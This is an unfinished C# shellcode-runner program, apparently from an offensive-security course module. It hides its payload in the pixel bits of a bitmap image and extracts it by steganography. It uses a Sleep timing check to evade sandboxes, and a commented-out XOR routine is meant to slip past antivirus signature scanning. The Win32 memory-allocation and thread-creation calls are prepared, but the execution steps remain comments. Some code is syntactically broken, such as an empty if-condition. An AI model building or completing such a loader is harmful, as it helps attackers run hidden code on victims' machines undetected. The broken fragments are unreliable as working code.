using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Drawing;

/**
 * TODO:
 *      We need to copy-paste the program from the link below and edit it to work with the payload byte array:
 *      https://www.codeproject.com/Tips/635715/Steganography-Simple-Implementation-in-Csharp
*/

namespace ShellcodeRunner
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        /*static byte[] ecksore(byte[] pl, byte[] key)
        {
            int j;
            j = 0;  // Inefficiency on purpose!!
            for (int i = 0; i < pl.Length; i++)
            {
                if (j == key.Length-1)
                    continue;
                pl[i] = pl[i] ^ key[j];
                j++;
            }
        }*/
        public static string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }

        public static int reverseBits(int n)
        {
            int result = 0;

            for (int i = 0; i < 8; i++)
            {
                result = result * 2 + n % 2;

                n /= 2;
            }

            return result;
        }

        static void Main(string[] args)
        {
            // Dealing with HBD
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
                return;

            // Alloc. space
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);  // TODO: obfs. values

            // pl
            int lenth = 640;
            byte[] luhmao = new byte[lenth];

            Bitmap bmp = new Bitmap(@"C:\Users\Robert\source\repos\ejb9469\Module6_ShellcodeRunner\Module6_ShellcodeRunner\bliss_enc.bmp", false);

            String data = "";
            String binstr = "";
            int n = 0;
            int cui = 0;
            int charValue = 0;
            for (int i = 0; i < bmp.Width; i++)
            {
                for (int j = 0; j < bmp.Height; j++)
                {
                    Color pixel = bmp.GetPixel(i, j);
                    for (int b = 0; b < 3; b++)
                    {
                        switch (cui % 3)
                        {
                            case 0:
                                {
                                    charValue = charValue * 2 + pixel.R % 2;
                                }
                                break;
                            case 1:
                                {
                                    charValue = charValue * 2 + pixel.G % 2;
                                }
                                break;
                            case 2:
                                {
                                    charValue = charValue * 2 + pixel.B % 2;
                                }
                                break;
                        }
                        cui++;
                        if (cui % 8 == 0)
                        {
                            charValue = reverseBits(charValue);
                            if (charValue )
                        }
                        if ((n+1) % 8 == 0)
                    {
                        data += Convert.ToChar(Convert.ToInt32(binstr, 2));
                        binstr = "";
                        if (pixel.ToArgb() % 2 != 0)
                        {
                            i = bmp.Width;
                            break;
                        }
                    }
                    if (pixel.ToArgb() % 2 == 0)
                        binstr += "0";
                    else
                        binstr += "1";
                    n++;
                }
            }

            /*int n = 0;
            for (int i = 0; i < bmp.Width; i++)
            {
                for (int j = 0; j < bmp.Height; j++)
                {

                    if (n >= lenth)
                    {
                        i = bmp.Width;
                        break;
                    }

                    Color pixel = bmp.GetPixel(i, j);
                    
                    R = pixel.R - pixel.R % 2;
                    G = pixel.G - pixel.G % 2;
                    B = pixel.B - pixel.B % 2;
                    int[] rgb = { R, G, B };

                    pixels[n] = rgb;

                    n++;

                }
            }

            int x = 0;
            for (int a = 0; a < 3; a++)
            {
                for (int i = a; i < pixels.Length; i += 3)
                {
                    if (x == 8)
                    {
                        if ()
                        data += Convert.ToChar(Convert.ToInt32(binstr, 2));
                        binstr = "";
                        x = 0;
                        continue;
                    }
                    if (i % 2 == 0)
                        binstr += "0";
                    else
                        binstr += "1";
                    x++;
                }
            }*/
            //data = Convert.ToString(Convert.ToInt32(binstr, 2));

            luhmao = Encoding.ASCII.GetBytes(data);
            System.Console.WriteLine(ByteArrayToString(luhmao));

            // Dealing with SBD
            //luhmao = ecksore(luhmao);

            // Virtual alloc
            // Copy bytes into buffer
            // Create thread (Ex numa?)

            if (mem != null)  // etc
            {
                // do your thing
            }

        }
    }
}
